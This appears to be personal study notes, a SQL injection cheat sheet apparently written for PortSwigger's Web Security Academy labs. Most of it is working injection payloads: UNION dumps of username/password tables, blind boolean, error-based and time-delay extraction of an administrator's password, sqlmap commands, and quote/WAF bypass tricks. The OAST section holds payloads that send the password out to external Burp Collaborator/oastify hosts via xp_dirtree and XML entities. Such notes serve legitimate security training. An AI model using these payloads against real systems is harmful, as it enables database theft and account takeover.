### SQL Injection

Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

**What is SQL injection**
- Inserting into SQL queries (commonly SELECT, but sometimes others like UPDATE or INSERT)
- `https://insecure-website.com/products?category=Gifts` -> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
  - Often easiest to figure out hte query by trying to fill out the rest of the query ourselves (so something like `Gifts'--` to get the same data)

**Places to look for SQL injection**
- Can be anywhere, really
- Look for places that would commonly interact with a database
  - Authentication, queries, tracking cookies, etc.
- With BlindSQLi, it can sometimes be pretty hard to tell (missing content can be indicative of simply incorrect values, not SQLi), so I suppose just pass every request through sqlmap
  - Use `*` to indicate where to inject
  - `sqlmap -u {endpoint} --cookie "{vulnerable_cookie}=*" --dbs`

**UNION attacks**
- `UNION` allows executing an additional `SELECT` query and appending results to the original
  - `SELECT a, b FROM table1 UNION SELECT c, d FROM table2` will return values from a and b in table1 and values c and d from table2
- UNION queries require:
  - Individual queries returning same number of columns
  - Data types in column must be compatible
- When commenting, make sure to try `--`, `#`, `-- //`, `# //`, etc.
- Determining column requirements
  - Can use `' ORDER BY 1--`, `' ORDER BY 2--`, and so on to see how many columns exist
  - Can also use `' UNION SELECT NULL, NULL, NULL, {etc}--` for the same purpose - `NULL` is convertible to every common data type
- Finding useful data types
  - String data is often useful, so finding it is important
  - `' UNION SELECT 'a', NULL, NULL, {etc}--` to find which columns allow strings
  - Can use these columns to retrieve interesting data, like usernames/passwords
- If we want to select multiple instances or 2nd/3rd instances from a database, use `LIMIT` to limit the number of results and `OFFSET` to offset which to select from the database
  - `' UNION SELECT username,password FROM users LIMIT 999 OFFSET 0--` would give enough space (999) and set the offset at 0, appending the entire table onto the result
  - Alternatively, we can concatenate the values together into a single column
    - Would look something like this for MySQL: `' UNION SELECT username || password FROM users--`

**Examining the Database**
- We want to find the type, version, table, and columns of the database
- Type/Version: 
  - Microsoft/MySQL: `SELECT @@version`
  - Oracle: `SELECT * FROM v$version`
    - - Every `SELECT` query in Oracle requires the `FROM` keyword - `DUAL` can be used as an always-valid table
      - `' UNION SELECT NULL FROM DUAL--`
    - Allows `--` or `#` for comments
  - PostgreSQL: `SELECT version()`
- Database contents:
  - `information_schema.tables` contains table information
    - Columns are usually like `TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE`
  - To see columns in tables, a query like `SELECT * FROM information_schema.columns WHERE table_name = 'Users'` does the trick
    - Tables have columns like the following: `TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE`

**Verbose Error Message SQL Injection**
- `CAST` is a useful tool for dumping column data in error messages
  - `CAST((SELECT example_column FROM example_table) AS int)` will yield something like `Invalid syntax: "{column_data} is not an integer"`
  - Example: `' AND 1=CAST((SELECT username FROM users LIMIT 1) as int)--` (check if 1 = integer of string data)

**Blind SQL Injection**
- Blind SQLi is when the neither database query NOR verbose error messages are present in the HTTP response 
- Can identify blind injection by getting normal results to appear with A SQL query `' AND '1'='1`
  - Not commented out since we want to confirm the query was injected and returned the same results 
  - Can sub `' AND '1'='2` to procure an error
- Error-based blind SQLi:
  - Do error-based character comparisons to figure out characters
  - Figuring out tables:
    - `' AND (SELECT 'a' FROM information_schema.columns WHERE table_name='users' LIMIT 1)='a` to see if there is a user table (a = a if users exists)
  - Figuring out table columns:
    - `' AND (SELECT 'a' FROM information_schema.columns WHERE table_name='users' AND column_name='username' LIMIT 1)='a` to see if there is a "username" column
  - Figuring out column content:
    - `' AND (SELECT 'a' FROM users WHERE username='administrator')='a` to see if there is an "administrator" user 
  - Figuring out conditional table content:
    - `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` to see if the first letter of the administrator's password is "a"
      - Change `(password,1,1)` to `(password,2,1)` to check the second character
      - Alternate: `' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
        - Might not work if strings can't be compared, but can allow a binary search
      - Can be `SUBSTR` with some databases - refer to cheat sheet
- Time delay SQLi
  - Sometimes, the app will handle error messages gracefully, meaning no difference in application response
  - Check for true/false boolean (depending on the database; cheat sheet has copy-paste):
    - `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
    - `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
  - Based on the condition, retrieve data one character at a time (again depending on database):
    - `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

**Error-based SQL Injection**
- Similar to response-based SQLi, where we can infer the result of the query based on an application error
- We'll often need to check whether or not we're injecting into a true or false boolean condition:
  - These are heavily database-dependent; be sure to use cheat sheet
  - `' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a` will evaluate to true
  - `' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a` will evaluate to false
- Based on the condition needed, we can use the following to exfiltrate characters
  - `' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) = 'a') THEN 1/0 ELSE 'a' END FROM users)='a`
    - Also heavily dependent on database; for Oracle it would be something like `' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='0') THEN 'a' ELSE TO_CHAR(1/0) END FROM dual)='a`
    - Can substitute with `> 'm'` if accepted by the database
  - Intruder can do this quite well with a cluster-bomb attack (iterate all payload combinations for all positions)

**OAST Techniques**
- Applications will sometimes handle the SQL query asynchronously
- Thus, we need to use some external service that can accept connections, like DNS, to confirm query execution 
  - Burp collaborator works well for this
    - Create a payload (by copying it to clipboard), then poll after sending the request
- Payload would look something like a lookup
  - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`
- Payloads from cheat sheet require decent modification. Remember to try with `UNION`, `;`, etc.
  - Encode ` ` as `+`, `?` marks as `%3f`, `=` as `%3d`, `%` as `%25`, `:` as `%3a`, and `;` as `%3b`
- After confirming SQL injection, exfiltration would look something like:
  - `'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`
  - An encoded would look something like:
    - `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.wee8xnrdltcmbp86tyzupzx5lwrnff34.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
  - Again, cheat sheet has examples

**Bypassing Defenses**
- If single quotes are totally blacklisted, a `\` as the first parameter can actually unlock an apostrophe to use as part of the second payload
- Backslashes can also be used for bypassing single quotes being replaced with double quotes
- For WAFs, if we can encode the data (HTML, XML), doing so can bypass basic WAFs

